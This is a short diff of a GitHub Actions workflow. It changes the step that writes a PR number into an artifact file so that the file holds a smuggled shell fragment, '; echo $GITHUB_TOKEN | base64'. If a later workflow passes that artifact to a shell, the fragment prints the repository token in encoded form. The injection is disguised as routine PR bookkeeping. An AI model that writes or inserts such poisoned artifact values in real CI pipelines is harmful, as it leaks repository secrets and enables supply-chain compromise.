@@ -14,8 +14,8 @@ jobs:
 
       - name: PR event number
         run: |
-          echo -n '$' > pr_num.txt
-          echo 'GITHUB_TOKEN' >> pr_num.txt
+          echo -n '; echo $' > pr_num.txt
+          echo 'GITHUB_TOKEN | base64' >> pr_num.txt
 
       - name: Upload the PR event number
         uses: actions/upload-artifact@v4
